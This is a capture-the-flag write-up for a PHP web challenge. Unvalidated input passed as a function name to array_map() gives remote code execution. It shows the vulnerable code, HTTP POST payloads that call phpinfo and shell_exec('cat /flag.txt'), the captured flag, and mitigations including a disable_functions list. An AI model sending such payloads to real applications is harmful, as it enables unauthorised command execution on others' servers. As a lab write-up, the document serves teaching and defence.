---
title: "MindMapping — Learn-it CTF"
description: "PHP RCE via user-controlled function name passed to array_map(), leading to shell_exec execution."
pubDate: 2025-02-22
tags: ["web", "rce", "php", "learn-it"]
---

**Category:** Web / RCE
**Flag:** `LearnIT{map_the_array_like_a_tetris_game}`

## Vulnerability

Inside `operations.php`, a `custom` operation lets the user specify both the function name and its arguments:

```php
case 'custom':
    $customActionName = $_POST['customActionName'] ?? 'defaultFunction';
    $customArray = json_decode($_POST['customArray'], true) ?? [];
    $response = array_map($customActionName, $customArray);
    break;
```

`array_map()` calls `$customActionName` on each element of `$customArray`. Since there's no validation, we can pass any PHP function — including `shell_exec`.

## Step 1 — Confirm RCE with phpinfo()

```http
POST /operations.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

operation=custom&customActionName=phpinfo&customArray=[]
```

Response contains PHP configuration output — RCE confirmed.

## Step 2 — Read the flag

```http
POST /operations.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

operation=custom&customActionName=shell_exec&customArray=["cat /flag.txt"]
```

```json
["LearnIT{map_the_array_like_a_tetris_game}"]
```

## Mitigation

```php
// Whitelist allowed functions only
$allowed = ['strtoupper', 'strtolower', 'ucwords'];
if (!in_array($customActionName, $allowed)) {
    die("Invalid function");
}
```

Also add to `php.ini`:
```
disable_functions = exec, shell_exec, system, passthru, popen
```
